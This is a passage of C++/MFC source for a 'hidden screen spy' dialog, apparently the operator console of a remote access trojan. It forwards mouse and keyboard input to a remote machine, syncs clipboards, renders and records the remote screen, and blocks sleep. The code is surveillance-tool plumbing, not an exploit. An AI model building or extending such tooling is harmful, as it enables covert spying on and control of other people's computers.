	if (m_bOnClose) 	return CDialog::PreTranslateMessage(pMsg);
	m_MYtagMSG->message = pMsg->message;
	m_MYtagMSG->wParam = pMsg->wParam;
	m_MYtagMSG->lParam = pMsg->lParam;
	switch (pMsg->message)
	{

	case WM_ERASEBKGND:
		return TRUE;
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
	case WM_MBUTTONDBLCLK:
	case WM_MOUSEMOVE:
	case WM_MOUSEWHEEL:
	{
		if (m_MYtagMSG->message == WM_MOUSEMOVE && GetKeyState(VK_LBUTTON) >= 0)
			break;
		m_MYtagMSG->lParam = MAKELPARAM(((LONG)LOWORD(m_MYtagMSG->lParam) ) * m_wZoom, ((LONG)HIWORD(m_MYtagMSG->lParam) ) * m_hZoom);
		m_MYtagMSG->x = (int)(((LONG)LOWORD(pMsg->lParam)) * m_wZoom + m_rect.left);
		m_MYtagMSG->y = (int)(((LONG)HIWORD(pMsg->lParam)) * m_hZoom + m_rect.top);
		SendCommand(m_MYtagMSG);
		return TRUE;
	}
	case WM_CHAR:
	{
		if (_istcntrl(pMsg->wParam))
			break;
		m_MYtagMSG->x = (int)(((LONG)LOWORD(pMsg->lParam)) * m_wZoom + m_rect.left);
		m_MYtagMSG->y = (int)(((LONG)HIWORD(pMsg->lParam)) * m_hZoom + m_rect.top);
		SendCommand(m_MYtagMSG);
		return TRUE;
	}
	case WM_KEYDOWN:
	case WM_KEYUP:
	{
		switch (m_MYtagMSG->wParam)
		{
		case VK_UP:
		case VK_DOWN:
		case VK_RIGHT:
		case VK_LEFT:
		case VK_HOME:
		case VK_END:
		case VK_PRIOR:
		case VK_NEXT:
		case VK_INSERT:
		case VK_RETURN:
		case VK_DELETE:
		case VK_BACK:
			break;
		}
		m_MYtagMSG->x = (int)(((LONG)LOWORD(pMsg->lParam)) * m_wZoom + m_rect.left);
		m_MYtagMSG->y = (int)(((LONG)HIWORD(pMsg->lParam)) * m_hZoom + m_rect.top);
		SendCommand(m_MYtagMSG);
		return TRUE;
	}

	}
	if (m_MYtagMSG->message == WM_KEYDOWN && m_MYtagMSG->wParam == VK_ESCAPE) return TRUE;
	if (m_MYtagMSG->message == WM_KEYDOWN && m_MYtagMSG->wParam == VK_RETURN) return TRUE;
	return CDialog::PreTranslateMessage(pMsg);
}


void CHideScreenSpyDlg::SendCommand(MYtagMSG* pMsg)
{
	if (!m_bIsCtrl)
	{
		return;
	}

	LPBYTE lpData = new BYTE[sizeof(MYtagMSG) + 1];
	lpData[0] = COMMAND_SCREEN_CONTROL_HIDE;
	memcpy(lpData + 1, pMsg, sizeof(MYtagMSG));
	m_iocpServer->Send(m_pContext, lpData, sizeof(MYtagMSG) + 1);

	SAFE_DELETE_AR(lpData);
}



void CHideScreenSpyDlg::UpdateLocalClipboard(char* buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;

	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GMEM_MOVEABLE, len);
	if (hglbCopy != NULL) {
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR)GlobalLock(hglbCopy);
		memcpy(lptstrCopy, buf, len);
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}

void CHideScreenSpyDlg::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR)GlobalLock(hglb);
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = COMMAND_SCREEN_SET_CLIPBOARD_HIDE;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb);
	::CloseClipboard();
	m_iocpServer->Send(m_pContext, lpData, nPacketLen);
	delete[] lpData;
}


void CHideScreenSpyDlg::DoPaint()
{
	if (m_bIsFirst)
	{
		DrawTipString(_T("Please wait - initial screen loading"));
		return;
	}
	if (m_bOnClose) return;
	//EnterCriticalSection(&m_cs);
	StretchBlt(m_hDC, 0, 0, rect.Width(), rect.Height(), m_hMemDC, 0, 0, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, SRCCOPY);
//	LeaveCriticalSection(&m_cs);
	if (m_bIsTraceCursor)
		DrawIconEx(
			m_hDC,									// handle to device context 
			(int)((float)m_RemoteCursorPos.x / m_wZoom),
			(int)((float)m_RemoteCursorPos.y / m_hZoom),
			m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex),	// handle to icon to draw 
			0, 0,										// width of the icon 
			0,											// index of frame in animated cursor 
			NULL,										// handle to background brush 
			DI_NORMAL | DI_COMPAT						// icon-drawing flags 
		);

	// Do not call CDialog::OnPaint() for painting messages
}

void CHideScreenSpyDlg::OnPaint()
{
	CPaintDC dc(this);

	if (m_bIsFirst)
	{
		DrawTipString(_T("Please wait - initial screen loading"));
		return;
	}
	if (m_bOnClose) return;
	//EnterCriticalSection(&m_cs);
	StretchBlt(m_hDC, 0, 0, rect.Width(), rect.Height(), m_hMemDC, 0, 0, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, SRCCOPY);
	//LeaveCriticalSection(&m_cs);
	if (m_bIsTraceCursor)
		DrawIconEx(
			m_hDC,									// handle to device context 
			(int)((float)m_RemoteCursorPos.x / m_wZoom),
			(int)((float)m_RemoteCursorPos.y / m_hZoom),
			m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex),	// handle to icon to draw 
			0, 0,										// width of the icon 
			0,											// index of frame in animated cursor 
			NULL,										// handle to background brush 
			DI_NORMAL | DI_COMPAT						// icon-drawing flags 
		);
	CDialog::OnPaint();
}


void CHideScreenSpyDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnCancel();
	CDialog::PostNcDestroy();
	delete this;
}

LRESULT CHideScreenSpyDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
{
	// TODO: Add your specialized code here and/or call the base class
	if (message == WM_POWERBROADCAST && wParam == PBT_APMQUERYSUSPEND)
	{
		return BROADCAST_QUERY_DENY; // 拦截系统待机, 休眠的请求
	}
	if (message == WM_ACTIVATE && LOWORD(wParam) != WA_INACTIVE && !HIWORD(wParam))
	{
		SetWindowPos(&wndTopMost, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		return TRUE;
	}
	if (message == WM_ACTIVATE && LOWORD(wParam) == WA_INACTIVE)
	{
		SetWindowPos(&wndNoTopMost, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		return TRUE;
	}

	return CDialog::WindowProc(message, wParam, lParam);
}

void CHideScreenSpyDlg::OnTimer(UINT nIDEvent)
{
	if (!m_aviFile.IsEmpty())
	{
		LPCTSTR	lpTipsString = _T("●");

		m_aviStream.Write(m_lpScreenDIB);

		// 提示正在录像
		//SetBkMode(m_hDC, TRANSPARENT);
		SetTextColor(m_hDC, RGB(0xff, 0x00, 0x00));
		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
	}
	CDialog::OnTimer(nIDEvent);
}



 bool CHideScreenSpyDlg::JPG_BMP(int cbit, void* input, int inlen, void* output)
 {
	 struct jpeg_decompress_struct jds;
	 struct jpeg_error_mgr jem;

	 // 设置错误处理
	 jds.err = jpeg_std_error(&jem);
	 // 创建解压结构
	 jpeg_create_decompress(&jds);
	 // 设置读取(输入)位置
	 jpeg_mem_src(&jds, (byte*)input, inlen);
	 // 读取头部信息
	 if (jpeg_read_header(&jds, true) != JPEG_HEADER_OK)
	 {
		 jpeg_destroy_decompress(&jds);
		 return false;
	 }
	 // 设置相关参数
	 switch (cbit)
	 {
	 case 16:
		 jds.out_color_space = JCS_EXT_RGB;
		 break;
	 case 24:
		 jds.out_color_space = JCS_EXT_BGR;
		 break;
	 case 32:
		 jds.out_color_space = JCS_EXT_BGRA;
		 break;
	 default:
		 jpeg_destroy_decompress(&jds);
		 return false;
	 }
	 // 开始解压图像
	 if (!jpeg_start_decompress(&jds))
	 {
		 jpeg_destroy_decompress(&jds);
		 return false;
	 }
	 int line_stride = (jds.output_width * cbit / 8 + 3) / 4 * 4;
	 while (jds.output_scanline < jds.output_height)
	 {
		 byte* pline = (byte*)output + jds.output_scanline * line_stride;
		 jpeg_read_scanlines(&jds, &pline, 1);
	 }
	 // 完成图像解压
	 if (!jpeg_finish_decompress(&jds))
	 {
		 jpeg_destroy_decompress(&jds);
		 return false;
	 }
	 // 释放相关资源
	 jpeg_destroy_decompress(&jds);

	 return true;
 }


 void CHideScreenSpyDlg::SendResetAlgorithm(UINT nAlgorithm)
 {
	 BYTE	bBuff[2];
	 bBuff[0] = COMMAND__SCREEN_ALGORITHM_RESET_HIDE;
	 bBuff[1] = nAlgorithm;
	 m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
 }

